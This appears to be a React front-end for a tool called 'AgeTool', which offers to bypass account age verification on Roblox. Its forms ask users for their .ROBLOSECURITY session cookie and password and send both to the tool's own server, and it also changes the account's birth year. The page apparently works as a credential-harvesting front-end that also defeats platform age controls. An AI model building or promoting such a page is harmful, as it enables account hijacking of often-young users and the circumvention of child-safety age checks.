'use client';

import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';

export default function AgeTool() {
  const [cookie, setCookie] = useState('');
  const [password, setPassword] = useState('');
  const [year, setYear] = useState('2015');
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [error, setError] = useState('');
  const [recentBypasses, setRecentBypasses] = useState([]);

  const handleBypass = async () => {
    setLoading(true);
    setError('');
    setMessage('');
    
    try {
      const response = await fetch('/api/bypass', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cookie, password }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      setMessage(`✓ Bypass successful! User ID: ${data.userId}`);
      setCookie('');
      setPassword('');
      fetchRecentBypasses();
    } catch (err) {
      setError(`✗ Error during bypass: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const handleChangeBirthdate = async () => {
    setLoading(true);
    setError('');
    setMessage('');

    try {
      const response = await fetch('/api/set-birthdate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cookie, year }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      setMessage(`✓ Birthdate changed to ${year}! New birthdate: ${data.birthdate}`);
      setCookie('');
    } catch (err) {
      setError(`✗ Error: ${err instanceof Error ? err.message : 'Unknown error'}`);
    } finally {
      setLoading(false);
    }
  };

  const fetchRecentBypasses = async () => {
    try {
      const response = await fetch('/api/recent-bypasses');
      if (response.ok) {
        const data = await response.json();
        setRecentBypasses(data.bypasses || []);
      }
    } catch (err) {
      console.error('Failed to fetch recent bypasses:', err);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 flex items-center justify-center p-4">
      <Card className="w-full max-w-md bg-slate-800 border-slate-700">
        <div className="p-6">
          <h1 className="text-3xl font-bold text-white mb-2">AgeTool</h1>
          <p className="text-slate-400 mb-6">Account Age Verification Bypass</p>

          <Tabs defaultValue="bypass" className="w-full">
            <TabsList className="grid w-full grid-cols-2 bg-slate-700">
              <TabsTrigger value="bypass">Execute Bypass</TabsTrigger>
              <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
            </TabsList>

            <TabsContent value="bypass" className="space-y-4 mt-4">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Cookie
                </label>
                <Input
                  type="password"
                  placeholder="Enter your .ROBLOSECURITY cookie"
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Password
                </label>
                <Input
                  type="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                />
              </div>

              <Button
                onClick={handleBypass}
                disabled={loading || !cookie || !password}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white"
              >
                {loading ? 'Processing...' : 'Execute Bypass'}
              </Button>

              {message && (
                <div className="p-3 bg-green-900 border border-green-700 rounded text-green-200 text-sm">
                  {message}
                </div>
              )}

              {error && (
                <div className="p-3 bg-red-900 border border-red-700 rounded text-red-200 text-sm">
                  {error}
                </div>
              )}

              {recentBypasses.length > 0 && (
                <div className="mt-4 p-3 bg-slate-700 rounded">
                  <h3 className="text-sm font-semibold text-slate-300 mb-2">
                    Recent Bypasses
                  </h3>
                  <div className="space-y-2">
                    {recentBypasses.slice(0, 3).map((bypass, idx) => (
                      <div
                        key={idx}
                        className="text-xs text-slate-400 p-2 bg-slate-600 rounded"
                      >
                        <p>User: {bypass.userId}</p>
                        <p>Time: {bypass.timestamp}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </TabsContent>

            <TabsContent value="birthdate" className="space-y-4 mt-4">
              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Cookie
                </label>
                <Input
                  type="password"
                  placeholder="Enter your .ROBLOSECURITY cookie"
                  value={cookie}
                  onChange={(e) => setCookie(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-300 mb-2">
                  Birth Year
                </label>
                <Input
                  type="text"
                  placeholder="e.g., 2015"
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  className="bg-slate-700 border-slate-600 text-white placeholder-slate-500"
                />
              </div>

              <Button
                onClick={handleChangeBirthdate}
                disabled={loading || !cookie || !year}
                className="w-full bg-purple-600 hover:bg-purple-700 text-white"
              >
                {loading ? 'Processing...' : 'Change Birthdate'}
              </Button>

              {message && (
                <div className="p-3 bg-green-900 border border-green-700 rounded text-green-200 text-sm">
                  {message}
                </div>
              )}

              {error && (
                <div className="p-3 bg-red-900 border border-red-700 rounded text-red-200 text-sm">
                  {error}
                </div>
              )}
            </TabsContent>
          </Tabs>
        </div>
      </Card>
    </div>
  );
}
